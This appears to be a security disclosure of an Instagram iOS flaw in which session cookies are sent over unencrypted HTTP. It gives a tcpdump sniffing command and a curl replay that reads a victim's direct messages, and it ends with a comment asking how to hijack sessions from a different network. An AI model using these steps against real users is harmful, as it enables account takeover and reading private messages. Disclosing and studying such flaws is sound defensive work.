
# Instagram iOS session hijack

Instagram makes API calls to non-HTTPS endpoints with session cookies in the 
request headers allowing full session hijack by a malicious actor.

Steps to reproduce (on Mac OS X):

 - Jump on an open or WEP encrypted wifi access point 
 - Put your network interface into promiscuous mode filtering on i.instagram.com
   <pre>
    sudo tcpdump -In -i en0 -s 2048 -A dst i.instagram.com
   </pre>
 - Wait for someone to use the Instagram iOS app on the same network
 - Extract cookie request header from the resulting output
 - Use sessionid cookie parameter to make any api call as that user
   Even https endpoints like direct messages.
   <pre>
    curl -H 'User-Agent: Instagram 6.0.4 (iPhone6,2; iPhone OS 7_1_1; en_GB; en-GB) AppleWebKit/420+' \
     -H 'Cookie: sessionid=REDACTED' \ 
     https://i.instagram.com/api/v1/direct_share/inbox/
   </pre>

This returns the user's direct message inbox as JSON
 
I was able to perform a session hijack on my own account on my laptop while
someone else browsed instagram on my iPhone.

I was also able to:
- take the cookie sniffed from the iOS app
- go to instagram.com as an unlogged in user.
- set document.cookie = $COOKIE
- navigate to a profile
- see I'm logged in as that user

There is some screwy behaviour where 'instagram.com/' gets into redirect loop,
I will see if I can fix that. However going to 'instagram.com/someones_profile'
works and shows me as logged in.

I think this attack is extremely severe because it allows full session hijack 
and is easily automated. I could go to the Apple Store tomorrow and reap thousands
of accounts in one day, and then use them to post spam.
 
Recommendations:

 - Use SSL everywhere
 - Revoke all logged-in sessions?



Yes you right, I can use section_id for any Facebook/ Instagram account and us it as nonlogin user, even if the account was secured with 2FA or SMS login or mobile notification, it's open as trusted device.

But how to hijacking setion_id if the victim machine and attacker in defrant network.
In JavaScript framwork (react js) the hijacking cookies will not working, the app(Instagram) using spasfic routs to nevagate between screen and not allowed to write a <script> to get the setion_id.
